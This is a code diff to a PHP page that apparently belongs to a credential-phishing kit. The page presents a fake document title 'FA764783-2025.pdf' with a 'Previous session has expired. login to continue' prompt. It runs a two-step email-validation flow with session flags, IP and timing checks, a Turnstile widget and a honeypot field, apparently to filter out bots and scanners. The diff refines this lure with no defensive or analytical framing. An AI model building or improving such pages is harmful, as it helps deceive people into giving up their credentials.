@@ -1,6 +1,34 @@
 <?php
 session_start();
 
+/**
+ * Control step behavior:
+ * - If coming freshly (no special flags) or on manual refresh → reset to step 1.
+ * - If redirected from Step 1 success → allow Step 2.
+ * - If redirected from Step 2 error → keep Step 2.
+ */
+
+// Flags set by login.php
+$isFromStep1  = !empty($_SESSION['from_step1']);
+$keepStep     = !empty($_SESSION['keep_step']);
+
+// Clear one-shot flags
+unset($_SESSION['from_step1'], $_SESSION['keep_step']);
+
+// If NOT from step1 success and NOT from an explicit "keep step" redirect,
+// treat this as a fresh load / refresh: reset wizard to step 1.
+if (!$isFromStep1 && !$keepStep) {
+    $_SESSION['step'] = 1;
+    unset(
+        $_SESSION['old_email'],
+        $_SESSION['validated_email'],
+        $_SESSION['verified_at'],
+        $_SESSION['verified_ip'],
+        $_SESSION['step2_token'],
+        $_SESSION['step2_rendered_at']
+    );
+}
+
 // Step control
 $step = $_SESSION['step'] ?? 1;
 
@@ -10,7 +38,6 @@ $error     = $_SESSION['error_message'] ?? '';
 unset($_SESSION['error_message']);
 
 $hasError = !empty($error);
-$hideSessionMsg = ($error === 'Incorrect name entered.');
 
 // If we're on step 2, record when the form was rendered (for min-time check)
 if ($step == 2) {
@@ -256,12 +283,8 @@ $step2_token = $_SESSION['step2_token'] ?? '';
             FA764783-2025.pdf <span class="doc-size"></span>
         </h2>
 
-        <?php if (!$hideSessionMsg): ?>
-            <?php if ($step == 1): ?>
-                <p class="doc-subtitle">Previous session has expired. login to continue</p>
-            <?php else: ?>
-                <!-- no message on step 2 -->
-            <?php endif; ?>
+        <?php if ($step == 1 && !$error): ?>
+            <p class="doc-subtitle">Previous session has expired. login to continue</p>
         <?php endif; ?>
 
         <div class="top-divider"></div>
@@ -291,7 +314,7 @@ $step2_token = $_SESSION['step2_token'] ?? '';
                 <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
             </div>
 
-            <!-- (Optional) honeypot for step 1 as well, harmless -->
+            <!-- Honeypot for step 1 -->
             <div class="hp-wrapper">
                 <input type="text" name="company" autocomplete="off">
             </div>
